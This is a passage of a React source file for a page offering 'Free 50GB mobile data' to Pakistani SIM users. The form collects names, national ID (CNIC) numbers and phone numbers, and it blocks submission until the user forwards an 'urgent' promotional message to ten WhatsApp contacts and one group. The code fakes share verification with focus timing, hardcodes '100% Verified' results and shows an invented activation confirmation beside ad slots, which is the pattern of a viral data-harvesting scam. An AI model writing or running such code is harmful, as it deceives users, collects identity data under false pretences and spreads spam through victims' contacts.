import React, { useState, useEffect, useRef } from 'react';
import { useNavigate, Link } from 'react-router-dom';
import confetti from 'canvas-confetti';
import {
  User,
  Phone,
  MessageSquare,
  MapPin,
  CheckCircle2,
  AlertCircle,
  Send,
  Share2,
  Copy,
  Check,
  Search,
  Sparkles,
  ArrowRight,
  ShieldCheck,
  Lock,
  Users,
  Wifi,
  Smartphone,
  Award,
  Loader2,
  RefreshCw,
  ExternalLink,
  CheckSquare,
  Zap,
  Radio,
} from 'lucide-react';
import { Application, ShareMeterStats } from '../types';
import { storageService } from '../services/storageService';
import { settingsService } from '../services/settingsService';
import { applicationService } from '../services/applicationService';
import { whatsappService } from '../services/whatsappService';
import { Button } from '../components/Button';
import { Input } from '../components/Input';
import { Textarea } from '../components/Textarea';
import { Checkbox } from '../components/Checkbox';
import { useLanguage } from '../context/LanguageContext';
import { AdSenseSlot } from '../components/AdSenseSlot';
import {
  isValidPhone,
  isValidPakistaniMobile,
  isValidCNIC,
  formatCNIC,
  formatMobileNumber,
  validateRequired,
} from '../utils/validation';

export const ApplyData: React.FC = () => {
  const navigate = useNavigate();
  const settings = settingsService.getProgramSettings();
  const waSettings = settingsService.getWhatsAppSettings();
  const { language, isUrdu, isEnglish, isDual, t } = useLanguage();

  // 1. Applicant & SIM Details
  const [fullName, setFullName] = useState('');
  const [nationalId, setNationalId] = useState('');
  const [simNetwork, setSimNetwork] = useState('Jazz');
  const [targetDataNumber, setTargetDataNumber] = useState('');
  const [whatsappNumber, setWhatsappNumber] = useState('');
  const [city, setCity] = useState('');

  // 2. Share Counters (0 to 10 for contacts, 0 to 1 for group)
  const [contactsSharedCount, setContactsSharedCount] = useState<number>(0);
  const [isGroupShared, setIsGroupShared] = useState<boolean>(false);

  // Background Telemetry & Transit Verification Tracker
  const [isSharingActive, setIsSharingActive] = useState<boolean>(false);
  const [activeShareMode, setActiveShareMode] = useState<'contact' | 'group' | null>(null);
  const transitStartRef = useRef<number | null>(null);
  const transitAppSwitchedRef = useRef<boolean>(false);

  const [feedbackBanner, setFeedbackBanner] = useState<{
    type: 'success' | 'warning' | 'info';
    message: string;
  } | null>(null);

  const [declaredTruth, setDeclaredTruth] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [submittedApp, setSubmittedApp] = useState<Application | null>(null);
  const [copiedId, setCopiedId] = useState(false);
  const [copiedMsg, setCopiedMsg] = useState(false);
  const [errors, setErrors] = useState<Record<string, string>>({});

  const targetContacts = waSettings.targetContactsCount || 10;
  const targetGroups = waSettings.targetGroupsCount || 1;

  // Load saved draft on mount
  useEffect(() => {
    try {
      const savedDraft = sessionStorage.getItem('citizengrant_50gb_draft_v1');
      if (savedDraft) {
        const parsed = JSON.parse(savedDraft);
        if (parsed.fullName) setFullName(parsed.fullName);
        if (parsed.nationalId) setNationalId(parsed.nationalId);
        if (parsed.simNetwork) setSimNetwork(parsed.simNetwork);
        if (parsed.targetDataNumber) setTargetDataNumber(parsed.targetDataNumber);
        if (parsed.whatsappNumber) setWhatsappNumber(parsed.whatsappNumber);
        if (parsed.city) setCity(parsed.city);
        if (typeof parsed.contactsSharedCount === 'number') {
          setContactsSharedCount(parsed.contactsSharedCount);
        }
        if (typeof parsed.isGroupShared === 'boolean') {
          setIsGroupShared(parsed.isGroupShared);
        }
      }
    } catch {
      // Ignore storage errors
    }
  }, []);

  // Save draft whenever state changes
  useEffect(() => {
    if (!submittedApp) {
      sessionStorage.setItem(
        'citizengrant_50gb_draft_v1',
        JSON.stringify({
          fullName,
          nationalId,
          simNetwork,
          targetDataNumber,
          whatsappNumber,
          city,
          contactsSharedCount,
          isGroupShared,
        })
      );
    }
  }, [
    fullName,
    nationalId,
    simNetwork,
    targetDataNumber,
    whatsappNumber,
    city,
    contactsSharedCount,
    isGroupShared,
    submittedApp,
  ]);

  // Check if form details are complete & formats are valid
  const areDetailsComplete = Boolean(
    fullName.trim().length >= 2 &&
      isValidCNIC(nationalId) &&
      isValidPakistaniMobile(targetDataNumber) &&
      isValidPakistaniMobile(whatsappNumber) &&
      city.trim().length >= 2
  );

  // Meter Calculation:
  // - 0%: Start
  // - 50%: 5 details completed & valid
  // - 50% -> 90%: 10 Contacts (+4% each)
  // - 90% -> 100%: 1 Group (+10%)
  let meterPercentage = 0;
  if (areDetailsComplete) {
    meterPercentage = 50;
    const contactPoints = Math.min(targetContacts, contactsSharedCount) * 4;
    meterPercentage += contactPoints;

    if (isGroupShared && contactsSharedCount >= targetContacts) {
      meterPercentage = 100;
    } else if (isGroupShared) {
      meterPercentage = Math.min(99, meterPercentage + 10);
    }
  } else {
    const filledCount = [
      Boolean(fullName.trim().length >= 2),
      Boolean(isValidCNIC(nationalId)),
      Boolean(isValidPakistaniMobile(targetDataNumber)),
      Boolean(isValidPakistaniMobile(whatsappNumber)),
      Boolean(city.trim().length >= 2),
    ].filter(Boolean).length;
    meterPercentage = Math.round((filledCount / 5) * 45);
  }

  const isMeterComplete = meterPercentage >= 100;

  // Handle CNIC input with auto-formatting
  const handleNationalIdChange = (val: string) => {
    const formatted = formatCNIC(val);
    setNationalId(formatted);
    if (errors.nationalId && isValidCNIC(formatted)) {
      setErrors((prev) => {
        const copy = { ...prev };
        delete copy.nationalId;
        return copy;
      });
    }
  };

  // Handle Target SIM Number input with auto-formatting
  const handleTargetNumberChange = (val: string) => {
    const formatted = formatMobileNumber(val);
    setTargetDataNumber(formatted);
    if (!whatsappNumber || whatsappNumber === targetDataNumber) {
      setWhatsappNumber(formatted);
    }
    if (errors.targetDataNumber && isValidPakistaniMobile(formatted)) {
      setErrors((prev) => {
        const copy = { ...prev };
        delete copy.targetDataNumber;
        return copy;
      });
    }
  };

  // Handle WhatsApp Number input with auto-formatting
  const handleWhatsappNumberChange = (val: string) => {
    const formatted = formatMobileNumber(val);
    setWhatsappNumber(formatted);
    if (errors.whatsappNumber && isValidPakistaniMobile(formatted)) {
      setErrors((prev) => {
        const copy = { ...prev };
        delete copy.whatsappNumber;
        return copy;
      });
    }
  };

  // Inline onBlur validators
  const handleBlurCNIC = () => {
    if (nationalId.trim() && !isValidCNIC(nationalId)) {
      setErrors((prev) => ({
        ...prev,
        nationalId: 'شناختی کارڈ نمبر درست 13 ہندسوں پر مشتمل ہونا چاہیے (مثلاً 42101-1234567-8)',
      }));
    }
  };

  const handleBlurTargetNumber = () => {
    if (targetDataNumber.trim() && !isValidPakistaniMobile(targetDataNumber)) {
      setErrors((prev) => ({
        ...prev,
        targetDataNumber: `درست 11 ہندسوں کا ${simNetwork} موبائل نمبر درج کریں (مثلاً 0300-1234567)`,
      }));
    }
  };

  const handleBlurWhatsappNumber = () => {
    if (whatsappNumber.trim() && !isValidPakistaniMobile(whatsappNumber)) {
      setErrors((prev) => ({
        ...prev,
        whatsappNumber: 'درست 11 ہندسوں کا واٹس ایپ نمبر درج کریں (مثلاً 0300-1234567)',
      }));
    }
  };

  // Telemetry transit detection
  useEffect(() => {
    const handleBlur = () => {
      if (transitStartRef.current) {
        transitAppSwitchedRef.current = true;
      }
    };

    const handleFocus = () => {
      if (transitStartRef.current && activeShareMode) {
        const timeAway = Date.now() - transitStartRef.current;
        const hasSwitchedApp = transitAppSwitchedRef.current;

        const mode = activeShareMode;
        transitStartRef.current = null;
        transitAppSwitchedRef.current = false;
        setIsSharingActive(false);

        // Verification Rule: Must have switched away to WhatsApp AND spent at least 3.8 seconds
        if (hasSwitchedApp && timeAway >= 3800) {
          if (mode === 'contact') {
            setContactsSharedCount((prev) => {
              const next = Math.min(targetContacts, prev + 1);
              if (next >= targetContacts && isGroupShared) {
                confetti({ particleCount: 80, spread: 70, origin: { y: 0.5 } });
              }
              return next;
            });

            setFeedbackBanner({
              type: 'success',
              message: `✅ 50GB ڈیٹا شیئرنگ کی تصدیق ہو گئی! (+1 شامل ہوا، ${Math.min(
                targetContacts,
                contactsSharedCount + 1
              )}/10 مکمل)`,
            });
          } else if (mode === 'group') {
            setIsGroupShared(true);
            if (contactsSharedCount >= targetContacts) {
              confetti({ particleCount: 100, spread: 80, origin: { y: 0.5 } });
            }
            setFeedbackBanner({
              type: 'success',
              message: '✅ واٹس ایپ گروپ شیئرنگ مکمل! 50GB ڈیٹا میٹر 100% ہو گیا اور سبمٹ بٹن فعال ہے۔',
            });
          }

          setErrors((prev) => {
            const copy = { ...prev };
            delete copy.contacts;
            delete copy.groups;
            return copy;
          });
        } else {
          setFeedbackBanner({
            type: 'warning',
            message: '⚠️ واٹس ایپ میں میسج سینڈ نہیں ہوا۔ براہ کرم واٹس ایپ پر جا کر میسج بھیجیں تاکہ کاؤنٹ شامل ہو۔',
          });
        }
      }
    };

    window.addEventListener('blur', handleBlur);
    window.addEventListener('focus', handleFocus);

    return () => {
      window.removeEventListener('blur', handleBlur);
      window.removeEventListener('focus', handleFocus);
    };
  }, [activeShareMode, contactsSharedCount, isGroupShared]);

  const handleShareContact = () => {
    if (!areDetailsComplete) {
      setErrors({
        form: 'براہ کرم پہلے اوپر دی گئی معلومات اور اپنا سِم نمبر درج کریں (50% مکمل کریں)۔',
      });
      window.scrollTo({ top: 160, behavior: 'smooth' });
      return;
    }

    setErrors((prev) => {
      const copy = { ...prev };
      delete copy.contacts;
      delete copy.form;
      return copy;
    });

    transitStartRef.current = Date.now();
    transitAppSwitchedRef.current = false;
    setActiveShareMode('contact');
    setIsSharingActive(true);

    setFeedbackBanner({
      type: 'info',
      message: `📲 واٹس ایپ کھل رہا ہے۔ دوست #${contactsSharedCount + 1} کو 50GB آفر میسج سینڈ کر کے واپس آئیں۔`,
    });

    const dataMsg = `🎁 *Free 50GB High-Speed Internet Offer 2026*\n\nGet 50GB (50,000 MB) Free 4G/5G Internet on your ${simNetwork} SIM. Activate online instantly with your CNIC and mobile number:\n${window.location.origin}/apply-data`;

    whatsappService.executeShare({
      placement: 'pre_submission_criteria',
      customMessage: dataMsg,
    });
  };

  const handleShareGroup = () => {
    if (!areDetailsComplete) {
      setErrors({
        form: 'براہ کرم پہلے اوپر دی گئی معلومات اور اپنا سِم نمبر درج کریں (50% مکمل کریں)۔',
      });
      window.scrollTo({ top: 160, behavior: 'smooth' });
      return;
    }

    if (contactsSharedCount < targetContacts) {
      setErrors({
        contacts: `براہ کرم پہلے 10 دوستوں کو میسج سینڈ کریں (${contactsSharedCount}/10 مکمل)`,
      });
      return;
    }

    setErrors((prev) => {
      const copy = { ...prev };
      delete copy.groups;
      return copy;
    });

    transitStartRef.current = Date.now();
    transitAppSwitchedRef.current = false;
    setActiveShareMode('group');
    setIsSharingActive(true);

    setFeedbackBanner({
      type: 'info',
      message: '📲 واٹس ایپ گروپ سلیکٹر کھل رہا ہے۔ کسی بھی 1 گروپ میں 50GB آفر میسج بھیج کر واپس آئیں۔',
    });

    const groupMsg = `📢 *Urgent: Free 50GB Mobile Internet Package Activation*\n\n50GB Free 4G Data available for Jazz, Zong, Telenor & Ufone users. Register your number now:\n${window.location.origin}/apply-data`;

    whatsappService.executeShare({
      placement: 'pre_submission_criteria',
      customMessage: groupMsg,
    });
  };

  const handleCopyMessage = () => {
    const msg = `🎁 *Free 50GB High-Speed Internet Offer 2026*\n\nGet 50GB Free 4G/5G Internet on your SIM. Activate online: ${window.location.origin}/apply-data`;
    navigator.clipboard.writeText(msg);
    setCopiedMsg(true);
    setTimeout(() => setCopiedMsg(false), 3000);
  };

  const handleResetDraft = () => {
    if (window.confirm('کیا آپ تمام درج کردہ معلومات اور شیئرز دوبارہ شروع کرنا چاہتے ہیں؟')) {
      sessionStorage.removeItem('citizengrant_50gb_draft_v1');
      setFullName('');
      setNationalId('');
      setSimNetwork('Jazz');
      setTargetDataNumber('');
      setWhatsappNumber('');
      setCity('');
      setContactsSharedCount(0);
      setIsGroupShared(false);
      transitStartRef.current = null;
      transitAppSwitchedRef.current = false;
      setIsSharingActive(false);
      setActiveShareMode(null);
      setFeedbackBanner(null);
      setErrors({});
    }
  };

  const validateForm = (): boolean => {
    const newErrors: Record<string, string> = {};

    if (!validateRequired(fullName) || fullName.trim().length < 2) {
      newErrors.fullName = 'پورا نام درج کریں (Full Name is required, min 2 characters)';
    }

    if (!validateRequired(nationalId)) {
      newErrors.nationalId = 'شناختی کارڈ نمبر درج کریں (CNIC is required)';
    } else if (!isValidCNIC(nationalId)) {
      newErrors.nationalId = 'درست 13 ہندسوں کا قومی شناختی کارڈ نمبر درج کریں (مثلاً 42101-1234567-8)';
    }

    if (!validateRequired(targetDataNumber)) {
      newErrors.targetDataNumber = `جس سِم پر 50GB ڈیٹا چاہیے وہ نمبر درج کریں (${simNetwork} Number is required)`;
    } else if (!isValidPakistaniMobile(targetDataNumber)) {
      newErrors.targetDataNumber = `درست 11 ہندسوں کا ${simNetwork} موبائل نمبر درج کریں (مثلاً 0300-1234567)`;
    }

    if (!validateRequired(whatsappNumber)) {
      newErrors.whatsappNumber = 'واٹس ایپ نمبر درج کریں (WhatsApp number is required)';
    } else if (!isValidPakistaniMobile(whatsappNumber)) {
      newErrors.whatsappNumber = 'درست 11 ہندسوں کا واٹس ایپ نمبر درج کریں (مثلاً 0300-1234567)';
    }

    if (!validateRequired(city) || city.trim().length < 2) {
      newErrors.city = 'اپنا درست شہر یا ضلع درج کریں (City / District is required)';
    }

    if (contactsSharedCount < targetContacts) {
      newErrors.contacts = `براہ کرم تمام 10 دوستوں کو میسج سینڈ کریں (${contactsSharedCount}/${targetContacts} مکمل)`;
    }

    if (!isGroupShared) {
      newErrors.groups = `میٹر 100% کرنے کے لیے کم از کم 1 واٹس ایپ گروپ میں میسج شیئر کریں`;
    }

    if (!declaredTruth) {
      newErrors.declaration = 'براہ کرم اقرار نامے کے خانے کو چیک کریں۔';
    }

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!validateForm()) {
      window.scrollTo({ top: 180, behavior: 'smooth' });
      return;
    }

    setIsSubmitting(true);

    try {
      await new Promise((resolve) => setTimeout(resolve, 600));

      const shareStats: ShareMeterStats = {
        contactsSharedCount: 10,
        groupsSharedCount: 1,
        meterPercentage: 100,
        isFullyQualified: true,
      };

      const app = applicationService.submitApplication({
        personalInfo: {
          fullName: fullName.trim(),
          nationalId: nationalId.trim(),
          phone: targetDataNumber.trim(),
          whatsappNumber: whatsappNumber.trim(),
          email: `${fullName.toLowerCase().replace(/\s+/g, '')}@citizengrantportal.org`,
        },
        addressInfo: {
          address: `${city.trim()}, Pakistan`,
          city: city.trim(),
        },
        householdInfo: {
          familyMembers: 1,
          dependents: 0,
          employmentStatus: `Free 50GB Mobile Broadband Relief Scheme`,
          monthlyIncome: 0,
          housingStatus: 'Residential',
        },
        reasonForApplication: `Free 50GB Mobile Data Package Activation (${simNetwork} - ${targetDataNumber})`,
        customFields: {
          portalType: 'FREE_50GB_DATA_SCHEME',
          simNetwork,
          targetDataNumber,
          packageAllocated: '50GB (50,000 MB) High-Speed 4G/5G (30 Days)',
          shareMeterScore: `100% Verified (10 WhatsApp Contacts & 1 Group Shared)`,
        },
        whatsappVerifiedBeforeSubmit: true,
      });

      storageService.updateApplication(app.applicationId, {
        shareMeter: shareStats,
      });

      const fullUpdated = storageService.getApplication(app.applicationId);
      setSubmittedApp(fullUpdated || app);
      sessionStorage.removeItem('citizengrant_50gb_draft_v1');

      confetti({
        particleCount: 120,
        spread: 80,
        origin: { y: 0.6 },
      });

      window.scrollTo({ top: 0, behavior: 'smooth' });
    } catch (err) {
      console.error(err);
      setErrors({ form: 'درخواست جمع کرنے کے دوران مسئلہ پیش آیا۔ براہ کرم دوبارہ کوشش کریں۔' });
    } finally {
      setIsSubmitting(false);
    }
  };

  const copyAppId = () => {
    if (submittedApp) {
      navigator.clipboard.writeText(submittedApp.applicationId);
      setCopiedId(true);
      setTimeout(() => setCopiedId(false), 3000);
    }
  };

  // =========================================================================
  // VIEW 1: DATA ACTIVATION SUCCESS SCREEN
  // =========================================================================
  if (submittedApp) {
    return (
      <div className="container-narrow" style={{ padding: '1.5rem 0.75rem' }}>
        <div
          className="card responsive-card"
          style={{
            textAlign: 'center',
            boxShadow: 'var(--shadow-md)',
            border: '1.5px solid #0284c7',
          }}
        >
          <div
            style={{
              width: '54px',
              height: '54px',
              borderRadius: '50%',
              backgroundColor: '#e0f2fe',
              color: '#0284c7',
              display: 'inline-flex',
              alignItems: 'center',
              justifyContent: 'center',
              marginBottom: '0.75rem',
            }}
          >
            <Wifi size={32} strokeWidth={2.2} />
          </div>

          <div
            style={{
              display: 'inline-flex',
              alignItems: 'center',
              gap: '0.3rem',
              backgroundColor: '#e0f2fe',
              color: '#0369a1',
              padding: '0.2rem 0.65rem',
              borderRadius: 'var(--radius-full)',
              fontSize: '0.75rem',
              fontWeight: 800,
              marginBottom: '0.5rem',
              border: '1px solid #bae6fd',
            }}
          >
            <Zap size={13} /> Free 50GB Mobile Data Queued
          </div>

          <h2 style={{ fontSize: '1.35rem', fontWeight: 800, color: 'var(--navy-900)', marginBottom: '0.35rem' }}>
            50GB ڈیٹا ایکٹیویشن کی درخواست موصول ہوگئی!
          </h2>

          <p
            style={{
              fontSize: '0.85rem',
              color: 'var(--text-muted)',
              maxWidth: '480px',
              margin: '0 auto 1.25rem',
              lineHeight: '1.5',
            }}
          >
            تصدیق کے بعد <strong>50GB (50,000 MB)</strong> مفت 4G/5G ڈیٹا آپ کی <strong>{simNetwork}</strong> سِم پر 30 دنوں کے لیے فعال کر دیا جائے گا۔
          </p>

          {/* Reference ID Banner */}
          <div
            style={{
              backgroundColor: '#f0fdf4',
              border: '1.5px dashed var(--primary-600)',
              borderRadius: '10px',
              padding: '1rem',
              maxWidth: '400px',
              margin: '0 auto 1.25rem',
              display: 'flex',
              flexDirection: 'column',
              alignItems: 'center',
              gap: '0.35rem',
            }}
          >
            <span
              style={{
                fontSize: '0.72rem',
                textTransform: 'uppercase',
                letterSpacing: '0.05em',
                color: 'var(--primary-800)',
                fontWeight: 700,
              }}
            >
              Data Tracking ID (درخواست نمبر)
            </span>
            <div
              style={{
                fontFamily: 'var(--font-mono)',
                fontSize: '1.45rem',
                fontWeight: 800,
                color: 'var(--primary-900)',
                letterSpacing: '0.03em',
              }}
            >
              {submittedApp.applicationId}
            </div>
            <Button
              variant="secondary"
              size="sm"
              onClick={copyAppId}
              icon={copiedId ? <Check size={14} color="var(--primary-600)" /> : <Copy size={14} />}
            >
              {copiedId ? 'Copied! (کاپی ہوگیا)' : 'Copy Reference ID'}
            </Button>
          </div>

          {/* Package Summary Card */}
          <div
            style={{
              backgroundColor: 'var(--surface-subtle)',
              border: '1px solid var(--border)',
              borderRadius: 'var(--radius-md)',
              padding: '1.25rem',
              textAlign: 'left',
              maxWidth: '460px',
              margin: '0 auto 2rem',
              fontSize: '0.875rem',
              display: 'flex',
              flexDirection: 'column',
              gap: '0.5rem',
            }}
          >
            <div
              style={{
                fontWeight: 700,
                color: 'var(--navy-900)',
                borderBottom: '1px solid var(--border)',
                paddingBottom: '0.35rem',
              }}
            >
              SIM & Data Package Details
            </div>
            <div>
              <strong>Applicant:</strong> {submittedApp.personalInfo?.fullName} (CNIC: {submittedApp.personalInfo?.nationalId})
            </div>
            <div>
              <strong>SIM Network:</strong> {submittedApp.customFields?.simNetwork || simNetwork}
            </div>
            <div>
              <strong>Target Data SIM Number:</strong> {submittedApp.personalInfo?.phone}
            </div>
            <div>
              <strong>Allocated Data Volume:</strong> 50,000 MB (50 GB) - 30 Days Free
            </div>
            <div style={{ color: 'var(--whatsapp-dark)', fontWeight: 700, marginTop: '0.25rem' }}>
              ✓ WhatsApp Outreach Meter: 100% Verified (10 Contacts + 1 Group Shared)
            </div>
          </div>

          {/* Action Buttons */}
          <div style={{ display: 'flex', flexWrap: 'wrap', justifyContent: 'center', gap: '1rem' }}>
            <Link
              to={`/application-status?id=${encodeURIComponent(submittedApp.applicationId)}`}
              className="btn btn-primary btn-lg"
            >
              <Search size={18} />
              <span>Track Activation Status</span>
            </Link>

            <Link to="/" className="btn btn-secondary btn-lg">
              Return to Home
            </Link>
          </div>
        </div>
      </div>
    );
  }

  // =========================================================================
  // VIEW 2: 50GB DATA ACTIVATION APPLICATION FORM
  // =========================================================================
  return (
    <div style={{ backgroundColor: 'var(--navy-50)', minHeight: 'calc(100vh - 56px)', padding: '1.25rem 0 2.5rem' }}>
      <div className="container-narrow">
        {/* Top Header Card */}
        <div style={{ marginBottom: '1rem', textAlign: 'center' }}>
          <div
            style={{
              display: 'inline-flex',
              alignItems: 'center',
              gap: '0.35rem',
              backgroundColor: '#e0f2fe',
              color: '#0369a1',
              padding: '0.2rem 0.65rem',
              borderRadius: 'var(--radius-full)',
              fontSize: '0.72rem',
              fontWeight: 800,
              marginBottom: '0.4rem',
              border: '1px solid #7dd3fc',
            }}
          >
            <Zap size={13} />
            <span>Limited Free 50GB Internet Scheme 2026</span>
          </div>

          <h1 className="page-title" style={{ fontWeight: 800, color: 'var(--navy-900)', marginBottom: '0.25rem' }}>
            {isUrdu ? 'مفت 50GB موبائل ڈیٹا ایکٹیویشن' : 'Free 50GB Mobile Data Activation'}
          </h1>
          <p className="page-subtitle" style={{ color: 'var(--navy-600)', maxWidth: '540px', margin: '0 auto' }}>
            {isUrdu
              ? 'سِم کارڈ کمپنی اور نمبر درج کریں، پھر 10 دوستوں اور 1 گروپ میں شیئر کر کے میٹر 100% مکمل کریں۔'
              : 'Select your SIM, enter your number, and complete 10 contacts + 1 group share to activate 50GB.'}
          </p>
        </div>

        {/* AdSense Top Banner */}
        <AdSenseSlot format="horizontal" />

        {/* =========================================================================
            DYNAMIC INTERACTIVE ELIGIBILITY & SHARE METER BAR (0% -> 50% -> 90% -> 100%)
            ========================================================================= */}
        <div
          className="card responsive-card"
          style={{
            marginBottom: '1rem',
            backgroundColor: '#ffffff',
            border: isMeterComplete ? '1.5px solid #25D366' : '1px solid var(--border)',
            boxShadow: isMeterComplete ? '0 4px 15px -3px rgba(37, 211, 102, 0.25)' : 'var(--shadow-xs)',
          }}
        >
          {/* Meter Top Header */}
          <div
            style={{
              display: 'flex',
              justifyContent: 'space-between',
              alignItems: 'center',
              marginBottom: '0.4rem',
              gap: '0.4rem',
            }}
          >
            <div style={{ display: 'flex', alignItems: 'center', gap: '0.5rem' }}>
              <div
                style={{
                  width: '30px',
                  height: '30px',
                  borderRadius: '50%',
                  backgroundColor: isMeterComplete
                    ? '#25D366'
                    : meterPercentage >= 50
                    ? '#0284c7'
                    : 'var(--navy-200)',
                  color: '#ffffff',
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'center',
                  fontWeight: 800,
                  fontSize: '0.75rem',
                  flexShrink: 0,
                }}
              >
                {isMeterComplete ? <Check size={16} strokeWidth={3} /> : `${meterPercentage}%`}
              </div>
              <div>
                <span style={{ fontSize: '0.875rem', fontWeight: 800, color: 'var(--navy-900)' }}>
                  {isUrdu ? '50GB ڈیٹا اہلیت میٹر' : '50GB Data Eligibility Meter'}
                </span>
                <div style={{ fontSize: '0.72rem', color: 'var(--navy-600)' }}>
                  {isMeterComplete
                    ? '🎉 100% مکمل! نیچے بٹن سے 50GB ڈیٹا ایکٹیویٹ کریں۔'
                    : meterPercentage >= 90
                    ? '90% مکمل - 1 واٹس ایپ گروپ میں شیئر کر کے 100% حاصل کریں'
                    : meterPercentage >= 50
                    ? `50% مکمل - واٹس ایپ پر میسج بھیجیں (${contactsSharedCount}/10)`
                    : 'پہلے سِم کمپنی اور نمبر درج کریں (50%)'}
                </div>
              </div>
            </div>

            <div style={{ display: 'flex', alignItems: 'center', gap: '0.5rem', flexShrink: 0 }}>
              <button
                type="button"
                onClick={handleResetDraft}
                title="Reset Form"
                style={{
                  background: 'none',
                  border: 'none',
                  color: 'var(--navy-400)',
                  cursor: 'pointer',
                  display: 'flex',
                  alignItems: 'center',
                  gap: '0.2rem',
                  fontSize: '0.7rem',
                }}
              >
                <RefreshCw size={10} /> Reset
              </button>

              <span
                style={{
                  fontFamily: 'var(--font-mono)',
                  fontSize: '1.15rem',
                  fontWeight: 800,
                  color: isMeterComplete ? '#15803d' : meterPercentage >= 50 ? '#0369a1' : 'var(--navy-700)',
                }}
              >
                {meterPercentage}%
              </span>
            </div>
          </div>

          {/* Visual Progress Bar Track */}
          <div
            style={{
              width: '100%',
              backgroundColor: 'var(--navy-100)',
              borderRadius: 'var(--radius-full)',
              height: '8px',
              overflow: 'hidden',
              margin: '0.35rem 0',
              border: '1px solid var(--navy-200)',
            }}
          >
            <div
              style={{
                height: '100%',
                width: `${meterPercentage}%`,
                background: isMeterComplete
                  ? 'linear-gradient(90deg, #10b981 0%, #25D366 100%)'
                  : meterPercentage >= 90
                  ? 'linear-gradient(90deg, #0284c7 0%, #10b981 100%)'
                  : 'linear-gradient(90deg, #3b82f6 0%, #0ea5e9 100%)',
                borderRadius: 'var(--radius-full)',
                transition: 'width 400ms ease',
              }}
            />
          </div>

          {/* 4 Milestones Indicators Grid */}
          <div
            className="milestones-grid"
            style={{
              marginTop: '0.35rem',
              fontSize: '0.7rem',
              textAlign: 'center',
            }}
          >
            <div style={{ color: 'var(--navy-600)', fontWeight: 600, padding: '0.2rem', backgroundColor: 'var(--navy-50)', borderRadius: '4px' }}>
              <div style={{ fontWeight: 800, color: 'var(--navy-900)' }}>0%</div>
              <span>Start</span>
            </div>

            <div style={{ color: areDetailsComplete ? 'var(--primary-700)' : 'var(--navy-500)', fontWeight: 600, padding: '0.2rem', backgroundColor: areDetailsComplete ? '#f0fdf4' : 'var(--navy-50)', borderRadius: '4px' }}>
              <div style={{ fontWeight: 800, color: areDetailsComplete ? '#15803d' : 'var(--navy-700)' }}>
                {areDetailsComplete ? '✓ 50%' : '50%'}
              </div>
              <span>SIM & Details</span>
            </div>

            <div
              style={{
                color: contactsSharedCount >= targetContacts ? 'var(--primary-700)' : 'var(--navy-500)',
                fontWeight: 600,
                padding: '0.2rem',
                backgroundColor: contactsSharedCount >= targetContacts ? '#f0fdf4' : 'var(--navy-50)',
                borderRadius: '4px',
              }}
            >
              <div
                style={{
                  fontWeight: 800,
                  color: contactsSharedCount >= targetContacts ? '#15803d' : 'var(--navy-700)',
                }}
              >
                {contactsSharedCount >= targetContacts ? '✓ 90%' : `${50 + contactsSharedCount * 4}%`}
              </div>
              <span>10 Friends ({contactsSharedCount}/10)</span>
            </div>

            <div style={{ color: isMeterComplete ? 'var(--primary-700)' : 'var(--navy-500)', fontWeight: 600, padding: '0.2rem', backgroundColor: isMeterComplete ? '#f0fdf4' : 'var(--navy-50)', borderRadius: '4px' }}>
              <div style={{ fontWeight: 800, color: isMeterComplete ? '#15803d' : 'var(--navy-700)' }}>
                {isMeterComplete ? '✓ 100%' : '100%'}
              </div>
              <span>1 Group ({isGroupShared ? 1 : 0}/1)</span>
            </div>
          </div>
        </div>

        {/* Live Feedback Notification Banner */}
        {feedbackBanner && (
          <div
            className={`alert ${
              feedbackBanner.type === 'success'
                ? 'alert-success'
                : feedbackBanner.type === 'warning'
                ? 'alert-warning'
                : 'alert-info'
            }`}
            style={{
              marginBottom: '1.5rem',
              display: 'flex',
              alignItems: 'center',
              gap: '0.75rem',
              animation: 'fadeIn 200ms ease',
            }}
          >
            {isSharingActive ? (
              <Loader2 size={20} className="loading-spinner" style={{ borderTopColor: 'currentColor' }} />
            ) : feedbackBanner.type === 'success' ? (
              <CheckCircle2 size={20} color="#059669" />
            ) : (
              <AlertCircle size={20} />
            )}
            <span style={{ fontSize: '0.875rem', fontWeight: 600, lineHeight: '1.4' }}>
              {feedbackBanner.message}
            </span>
          </div>
        )}

        {/* Main Application Form Container */}
        <div className="card responsive-card" style={{ boxShadow: 'var(--shadow-sm)' }}>
          {errors.form && (
            <div className="alert alert-danger" style={{ marginBottom: '1.5rem' }}>
              <AlertCircle size={20} className="alert-icon" />
              <div className="alert-content">{errors.form}</div>
            </div>
          )}

          <form onSubmit={handleSubmit}>
            {/* =========================================================================
                SECTION 1: APPLICANT PERSONAL & SIM NETWORK DETAILS
                ========================================================================= */}
            <div style={{ borderBottom: '2px solid var(--navy-100)', paddingBottom: '1.5rem', marginBottom: '1.75rem' }}>
              <div style={{ display: 'flex', alignItems: 'center', gap: '0.6rem', marginBottom: '1rem' }}>
                <div
                  style={{
                    padding: '0.45rem',
                    backgroundColor: '#e0f2fe',
                    color: '#0284c7',
                    borderRadius: 'var(--radius-md)',
                  }}
                >
                  <Wifi size={20} />
                </div>
                <div>
                  <h3 style={{ fontSize: '1.1rem', fontWeight: 800, color: 'var(--navy-900)' }}>
                    1. SIM Card & Target Number (سِم اور معلومات)
                  </h3>
                  <p style={{ fontSize: '0.78rem', color: 'var(--text-muted)' }}>
                    سِم کارڈ کمپنی اور جس نمبر پر 50GB مفت ڈیٹا چاہیے وہ درج کریں (50% مکمل ہوگا)
                  </p>
                </div>
              </div>

              {/* 50GB Free Benefit Card */}
              <div
                style={{
                  backgroundColor: '#f0f9ff',
                  border: '1px solid #bae6fd',
                  borderRadius: 'var(--radius-md)',
                  padding: '0.75rem 1rem',
                  marginBottom: '1rem',
                  display: 'flex',
                  alignItems: 'center',
                  gap: '0.6rem',
                }}
              >
                <Zap size={20} color="#0284c7" style={{ flexShrink: 0 }} />
                <div style={{ fontSize: '0.8125rem', color: '#0369a1', lineHeight: '1.4' }}>
                  <strong>50GB High-Speed 4G/5G Offer:</strong> All networks supported. 30 days validity.
                </div>
              </div>

              {/* SIM Network Selector */}
              <div className="form-group" style={{ marginBottom: '1rem' }}>
                <label className="form-label">
                  Select Your SIM Network (سِم کارڈ نیٹ ورک منتخب کریں) <span className="required-star">*</span>
                </label>
                <div className="sim-network-grid">
                  {['Jazz', 'Zong 4G', 'Telenor', 'Ufone 4G', 'SCOM', 'Onic'].map((net) => (
